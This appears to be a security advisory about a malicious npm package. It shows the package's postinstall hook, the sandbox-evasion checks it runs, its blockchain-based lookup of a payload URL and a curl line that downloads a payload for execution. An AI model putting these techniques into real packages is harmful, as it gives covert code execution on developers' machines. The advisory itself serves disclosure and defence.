summary: @iobandamwer/cache-helper ships install-time native dropper with EtherHiding C2 and sandbox evasion
details: On npm install, package.json's postinstall hook runs `node -e "try{require('./addon.node').init()}catch(e){}"`, loading a shipped native ELF addon. The addon first enumerates CI/sandbox/analysis indicators (GITHUB_ACTIONS, GITLAB_CI, TRAVIS, CIRCLECI, JENKINS_URL, BUILDKITE, CODEBUILD_BUILD_ID, APPVEYOR, NETLIFY, VERCEL, SANDBOX, /proc/1/cgroup, /proc/1/cmdline, /proc/self/status TracerPid, docker/containerd/kubepod markers) to gate execution to real developer workstations. It then shells out `curl` with an Ethereum JSON-RPC `eth_getStorageAt` call to retrieve the next-stage URL from an attacker-controlled smart-contract storage slot (EtherHiding/DeadDrop pattern), downloads the payload via `curl -sS -m 30 -L --max-redirs 5 -o '/tmp/.<pid>' '<url>'`, chmods it, and executes it detached via fork/setsid/execlp. The payload URL is mutable and operator-rotatable through the blockchain storage slot, so takedown of a single host is ineffective. Installing this package yields unauthenticated full-host code execution on the developer's machine.
